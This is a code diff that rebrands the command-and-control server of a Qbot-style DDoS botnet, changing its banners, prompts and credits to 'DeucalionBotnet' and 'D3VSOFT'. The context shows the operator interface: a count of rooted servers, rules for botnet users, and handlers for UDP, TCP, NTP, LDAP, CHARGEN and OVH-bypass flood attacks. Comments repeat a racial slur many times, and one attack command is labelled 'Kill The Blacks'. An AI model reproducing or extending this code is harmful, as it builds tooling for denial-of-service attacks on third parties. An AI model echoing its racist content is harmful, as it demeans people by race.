@@ -349,7 +349,7 @@ void *TitleWriter(void *sock) {
     char string[2048];
     while(1) {
 		memset(string, 0, 2048);
-        sprintf(string, "%c]0; %d Rooted Servers || Superman Qbot On Top || Watch Out For The Kryptonite   %c", '\033', BotsConnected(), '\007');
+        sprintf(string, "%c]0; %d Rooted Servers || D3VSOFT Ltd. || Deucalion Cyber Security Ltd.   %c", '\033', BotsConnected(), '\007');
         if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 		sleep(2);
 		}
@@ -396,7 +396,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
   if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
 		char input [5000];
-        sprintf(input, "\e[1;31meDreamSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 		break;
 		}
@@ -417,7 +417,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
 				if(send(datafd, ops, strlen(ops), MSG_NOSIGNAL) == -1) return;
 				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
@@ -473,7 +473,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
 				if(send(datafd, s16,  strlen(s16),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
@@ -502,12 +502,12 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
                 sprintf(hp1, "\e[1;31m                      ╔══════════════════╗\r\n");
                 sprintf(hp2, "\e[1;31m                      ║  \e[37mCoded            \e[1;35m║ \r\n");
                 sprintf(hp3, "\e[1;31m                      ║  \e[37mBy               \e[1;35m║\r\n");
-                sprintf(hp4, "\e[1;31m                      ║  \e[37mCodeWritings     \e[1;35m║\r\n");
+                sprintf(hp4, "\e[1;31m                      ║  \e[37mD3VSOFT     \e[1;35m║\r\n");
                 sprintf(hp5, "\e[1;31m                      ╚═════════╦════════╝\r\n");
                 sprintf(hp6, "\e[1;31m                                ║\r\n");
                 sprintf(hp7, "\e[1;31m    ╔═════════════════════╗     ║   ╔═════════════════╗\r\n");
-                sprintf(hp8, "\e[1;31m    ║    \e[1;33mDreamSec         \e[1;35m║     ║   ║\e[37mDream EST. 2020  \e[1;35m║\r\n");
-                sprintf(hp9, "\e[1;31m    ║\e[37mMade By: CodeWritings\e[1;35m╠══╦══╩═══╣\e[37mDESC: PRIVATE    \e[1;35m║\r\n");
+                sprintf(hp8, "\e[1;31m    ║    \e[1;33mD3VSOFT         \e[1;35m║     ║   ║\e[37m2025  \e[1;35m║\r\n");
+                sprintf(hp9, "\e[1;31m    ║\e[37mMade By: D3VSOFT\e[1;35m╠══╦══╩═══╣\e[37mDESC: PRIVATE    \e[1;35m║\r\n");
                 sprintf(hp10,"\e[1;35m    ╚═════════════════════╝  ║      ║\e[37mAPI: \e[1;32mConnected   \e[1;35m║\r\n");
                 sprintf(hp11,"\e[1;35m                             ║      ╚═════════════════╝\r\n");
                 sprintf(hp12,"\e[1;35m       ╔═════════════════════╩═════════════════════╗\r\n");
@@ -540,7 +540,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
 
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
@@ -557,7 +557,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
 				char p9  [800];
 
                 sprintf(p1,  "\e[\e[1;35m ╔═════════════════════╦═══════════════╗\r\n");
-                sprintf(p2,  "\e[\e[1;35m ║\e[37mCoded By: \e[1;32mCodeWritings\e[1;33m║\e[1;33mRespect The Net\e[1;35m║\r\n");
+                sprintf(p2,  "\e[\e[1;35m ║\e[37mCoded By: \e[1;32mD3VSOFT\e[1;33m║\e[1;33mRespect The Net\e[1;35m║\r\n");
                 sprintf(p3,  "\e[\e[1;35m ╠═════════════════════╩═══════════════╣\r\n");
                 sprintf(p4,  "\e[\e[1;35m ║\e[37m1. Don't Share The Botnet IP         \e[1;35m║\r\n");
                 sprintf(p5,  "\e[\e[1;35m ║\e[37m2. Don't Share Logins                \e[1;35m║\r\n");
@@ -578,7 +578,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
 
 		pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
@@ -590,7 +590,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
 				if(send(datafd, r2,  strlen(r2), MSG_NOSIGNAL) == -1) goto end;
                 pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");;
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");;
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
@@ -611,7 +611,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
 				if(send(datafd, ry1,  strlen(ry1),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
@@ -633,7 +633,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
 			sprintf(ls5,  "\e[1;32m ?? [ AMPS ] ??    \e[1;32m- \e[1;33mShows Amplification Methods\r\n");//////////////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA/////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA///////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA
 			sprintf(ls6,  "\e[1;32m ?? [ API ] ??    \e[1;32m- \e[1;33mShows All API Methods\r\n");////////////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA
 			sprintf(ls7,  "\e[1;35m ?? [ !* STOP ] ?? \e[1;32m- \e[1;33mDont Work Its In Beta\r\n");//////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA
-			sprintf(ls8,  "\e[1;35mCoded \e[1;32mBy \e[1;33mCodeWritings#1337 ??\r\n");//////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA  	     
+			sprintf(ls8,  "\e[1;35mCoded \e[1;32mBy \e[1;33mD3VSOFT#1337 ??\r\n");//////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA  	     
              
              //////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA//////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA
              //////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAA//////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA//////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAAAAAAA////////////////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA////////////NIGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAA	AAAAAAAAAAAAAAAA
@@ -652,7 +652,7 @@ sprintf(ascii_banner_line9, "\e[1;33m ░  ░  ░   ░  ░     ░  ░\r\n"
 				if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
  		}
@@ -691,7 +691,7 @@ sprintf(ls8,  "\e[1;35m(/_ o _/) \r\n");
 				if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
  pthread_create(&title, NULL, &TitleWriter, sock);
 char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
  
@@ -730,7 +730,7 @@ char input [5000];
 				if(send(datafd, ls13,  strlen(ls13),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 
@@ -772,7 +772,7 @@ char input [5000];
 				if(send(datafd, ls9,  strlen(ls9),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
  		}
@@ -816,7 +816,7 @@ char input [5000];
 				if(send(datafd, ls13,  strlen(ls13),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
  		}
@@ -859,7 +859,7 @@ char input [5000];
 				if(send(datafd, ls13,  strlen(ls13),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
  		}
@@ -874,7 +874,7 @@ char input [5000];
 				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
 				while(1) {
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				break;
 				}
@@ -883,102 +883,102 @@ char input [5000];
 
 			if(strstr(buf, "!* UDP")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mUDP \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mUDP \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* TCP")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mTCP \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mTCP \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* NFO")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mNFO \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mNFO \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* SLAP-OVH")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mOVH Bypass [Server 666] \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mOVH Bypass [Server 666] \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* VPN-NULL")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mVPN [Server 1337] \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mVPN [Server 1337] \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* OVH-KISS")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mOVH Bypass [Superman Qbot Method That Kaiten Took] \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mOVH Bypass [Superman Qbot Method That Kaiten Took] \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* NUKE")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mNUKE [Superman Qbot API] \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mNUKE [Superman Qbot API] \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* VSE")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mGAME SERVER \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mGAME SERVER \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* STDHEX")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mSTDHEX \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mSTDHEX \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* JUNK")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mJUNK \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mJUNK \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* HOLD")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mHOLD \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mHOLD \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* KKK")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mKill The Blacks \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mKill The Blacks \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* HYDRA")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mHydra Bypass [Superman Qbot API] \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mHydra Bypass [Superman Qbot API] \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* LDAP")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mLDAP \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mLDAP \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* NTP")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mNTP \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mNTP \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* CHARGEN")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mCHARGEN \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mCHARGEN \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* RIP")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mRIP [Superman Qbot API] \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mRIP [Superman Qbot API] \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* ZAP")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mZAP [Superman Qbot API] \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mZAP [Superman Qbot API] \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* DEATH")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mDEATH [Superman Qbot API] \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mDEATH [Superman Qbot API] \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
         if(strstr(buf, "!* KILLALL")) 
         {    
-        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mSuperSec\x1b[1;33m] Sending \x1b[1;33mKILLALL [Superman Qbot API] \x1b[1;31mAttack\r\n");
+        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mDeucalionBotnet\x1b[1;33m] Sending \x1b[1;33mKILLALL [Superman Qbot API] \x1b[1;31mAttack\r\n");
         if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         }
 
@@ -998,7 +998,7 @@ char input [5000];
   if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
 				while(1) {
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				break;
 				}
@@ -1015,7 +1015,7 @@ char input [5000];
 
             trim(buf);
 		char input [5000];
-        sprintf(input, "\e[1;31mSuperSec~#");
+        sprintf(input, "\e[1;31mDeucalionBotnet~#");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
             if(strlen(buf) == 0) continue;
             printf("%s: \"%s\"\n",accounts[find_line].username, buf);
